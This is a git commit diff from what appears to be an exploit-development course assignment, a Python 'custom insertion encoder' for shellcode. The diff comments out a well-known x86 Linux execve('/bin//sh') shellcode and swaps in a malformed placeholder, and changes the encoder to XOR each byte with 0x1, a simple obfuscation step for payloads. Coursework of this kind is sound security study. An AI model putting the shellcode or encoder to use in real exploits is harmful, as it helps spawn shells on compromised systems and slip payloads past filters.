4bca5035f85247df17fd38ff1c86b8db9b2fefec
root <root@ubuntu.(none)>
2019-04-19 13:30:17 -0700

    Modified version of Assignment 4

--- assignment4/custom_insertion_encoder.py
+++ assignment4/custom_insertion_encoder.py
@@ -1,5 +1,5 @@
-shellcode = ('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')
-
+#shellcode = ('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')
+shellcode = ('\xa1\xb2\c3\d4')
 
 encoded_with_0x = ''
 encoded_with_slash_x = ''
@@ -13,13 +13,13 @@ for byte in bytearray(shellcode):
 	#print 'byte: '+str(byte)
 	#print '02x: %02x' % byte
 	encoded_with_slash_x += '\\x'
-	encoded_with_slash_x += '%02x' % byte
-	encoded_with_slash_x += '\\x%02x' % byte
+	encoded_with_slash_x += '%02x' % (byte^0x1)
+	encoded_with_slash_x += '\\x%02x' % (byte^0x1)
 
 
 	encoded_with_0x += '0x'
-	encoded_with_0x += '%02x,' % byte
-	encoded_with_0x += '0x%02x,' % byte
+	encoded_with_0x += '%02x,' % (byte^0x1)
+	encoded_with_0x += '0x%02x,' % (byte^0x1)
 
 print original_shellcode
 print '\n'
